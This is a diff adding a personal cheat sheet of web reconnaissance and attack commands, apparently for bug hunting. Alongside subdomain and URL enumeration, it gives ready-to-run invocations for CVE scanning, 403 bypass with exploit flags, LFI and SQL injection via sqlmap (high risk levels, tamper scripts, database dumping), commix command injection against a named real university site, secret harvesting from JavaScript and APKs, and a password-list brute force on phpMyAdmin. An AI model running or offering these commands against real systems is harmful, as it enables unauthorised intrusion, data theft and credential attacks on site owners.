@@ -1,0 +1,148 @@
+-+=============================================================================================================================+-
+cd /mnt/c/Users/nuLL/Desktop/cmder
+
+
+subfinder -d $DOMAIN -v -nW > activeDomain.txt
+
+httpx -l activeDomain.txt -o running_urls.txt
+
+nuclei -l running_urls.txt -t nuclei-templates -o "nuclei_out_for.txt"
+
+nuclei -u https://example.com -t ./cent-nuclei-templates/templates -tags cve
+
+nuclei -t ./nuclei-drupal-sa/templates/ --target https://www.example.com
+
+nuclei -u https://example.com -t ./cent-nuclei-templates/templates -tags cve
+
+nuclei -t /nuclei-drupal-sa/templates/ --target https://www.example.com
+
+cat running_urls.txt | jaeles scan -s <signature>
+
+dirsearch -l running_urls.txt -i 200,403 --deep-recursive --random-agent
+
+gobuster dns -d google.com -w WordLists-master/Subdomain.txt  -v
+
+bash /mnt/c/Users/nuLL/Desktop/nuLL/4-ZERO-3/403-bypass.sh -u  --exploit
+
+python3 lfimap.py -F  lfiResults.txt --use-long -a -v
+-+=============================================================================================================================+-
+
+cat waybackurls.txt | anew waybackurls.txt > fresh_waybackurls.txt
+nomore403 -u https://domain.com/admin
+
+Parse request from Burp
+nomore403 --request-file request.txt
+
+interactsh-server -domain $DOMAIN
+
+cat js_url.txt | while read url; do python3 exploit.py -u $url -o cli; done
+
+-+=============================================================================================================================+-
+
+cat activeDomain.txt | waybackurls > waybackurls.txt
+
+cat waybackurls.txt | gf sqli > sqliResults.txt
+
+cat waybackurls.txt | gf rce > rceResults.txt
+
+cat waybackurls.txt | gf lfi > lfiResults.txt
+
+cat waybackurls.txt | gf idor > idorResults.txt
+
+cat waybackurls.txt | gf xss | kxss > xssResults.txt
+
+sqlmap -m sqliResults.txt --batch --random-agent --level 5 --risk 3 -v 3 --dbs | tee -a sqli.txt
+
+gau $domain | gf xss | sed 's/=.*/=/' | sed 's/URL: //' | dalfox pipe -o xss.txt
+
+-+=============================================================================================================================+-
+
+gobuster dns -d google.com -w ~/wordlists/subdomains.txt
+
+katana -list running_urls.txt -o katana_crawl.txt
+
+cat katana_crawl.txt | gfx xss* | tee xss_url.txt
+
+cat katana_crawl.txt | grep .js | tee js_url.txt
+
+cat js_url.txt | while read url; do python3 /mnt/c/Users/nuLL/Desktop/nuLL/SecretFinder-master/SecretFinder.py -i $url -o cli; done
+
+cat running_urls.txt | waybackurls | grep -iE '\.js'|grep -ivE '\.json'|sort -u  > js_url.txt
+
+subjs -i running_urls.txt > js_url.txt
+
+python3 /mnt/c/Users/nuLL/Desktop/nuLL/JSScanner/JSScanner.py
+
+-+=============================================================================================================================+-
+
+echo https://google.com | hakrawler -subs
+
+cat urls.txt | hakrawler
+
+echo hackerone.com | naabu -silent | httpx -silent
+
+http://hackerone.com:8443
+http://hackerone.com:443
+http://hackerone.com:8080
+http://hackerone.com:80
+
+ffuf -u $domainName/FUZZ -mc 200,403 -v -w wordlist/micro.txt
+
+./bypass-403.sh website-here path-here
+
+python3 sqlmap.py -u "https://localhost/wordpress/wp-admin/admin.php?page=tsvg-admin&orderby=TS_VG_Title&order=desc" --batch --dbms=mysql --thread 10 --no-cast --random-agent -v 3 --tamper="between,randomcase,space2comment" --level=5 --risk=3 -p orderby --cookie=""
+
+python3 sqlidetector.py -f /mnt/c/Users/nuLL/Desktop/Scanner/php_url.txt
+
+python3 commix.py -u https://results.andhrauniversity.edu.in/dashboard/main-view?type=education --method=GET --current-user --level 3 --random-agent -v 3
+
+python3 ~/tools/Corsy/corsy.py -u $domainName | tee cors.txt
+
+amass enum -d $domain
+
+assetfinder google.com | hakrawler -plain | hakcheckurl | grep -v 404
+cat domains.txt | gau --threads 5
+cat urls.txt | subjs 
+cat urls.txt | qsreplace -a 
+cat urls.txt | html-tool comments
+cat urls.txt | httprobe
+cat urls.txt | inscope
+ ghauri -u http://www.site.com/vuln.php?id=1 --dbs
+-+=============================================================================================================================+-
+
+subfinder -d example.com | httpx-toolkit | tee domains.txt
+
+python3 CjFinder.py domains.txt --all
+
+-+=============================================================================================================================+-
+
+python3 ~/tools/ssl-checker/ssl_checker.py -H $domainName | tee ssl.txt
+
+python3 ~/tools/theHarvester/theHarvester.py -d $domain -b all -l 500
+
+python3 ~/tools/robotScraper/robotScraper.py -d $domain -s output_robot.txt 
+
+echo $domainName | hakrawler | tee -a paths.txt
+
+gau $domain >> paths.txt
+
+arjun -u $domainName -oT parameters.txt
+
+python3 ~/tools/shcheck/shcheck.py $domainName | tee headers.txt
+
+subjack -d $domain -ssl -v | tee takeover.txt
+
+python3 ~/tools/Bolt/bolt.py -u $domainName -l 2 | tee -a csrf.txt
+
+gau $domain | gf redirect archive | qsreplace | tee or_urls.txt
+
+echo /output_apktool/ | nuclei -t Keys/
+
+echo /output_apktool/ | nuclei -t Keys/xxxxx.yaml
+
+python3 -m pip install -r req.txt
+
+python3 main.py -t https://example/phpmyadmin/ -u phpmyadmin -p ../passwords.txt -r 100
+
+
+
